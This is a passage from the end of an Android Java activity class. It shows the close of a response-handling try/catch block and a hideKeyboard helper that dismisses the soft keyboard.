				{
					response = (String) result[1];
					//AppUtils.showDialog(DashBoardActivity.this, response);
				}
				
			}catch (Exception e) {
				e.printStackTrace();
			}
		}
	} 
	
	private void hideKeyboard() {   
	    // Check if no view has focus:
	    View view = this.getCurrentFocus();
	    if (view != null) {
	        InputMethodManager inputManager = (InputMethodManager) this.getSystemService(Context.INPUT_METHOD_SERVICE);
	        inputManager.hideSoftInputFromWindow(view.getWindowToken(), InputMethodManager.HIDE_NOT_ALWAYS);
	    }
	}
}
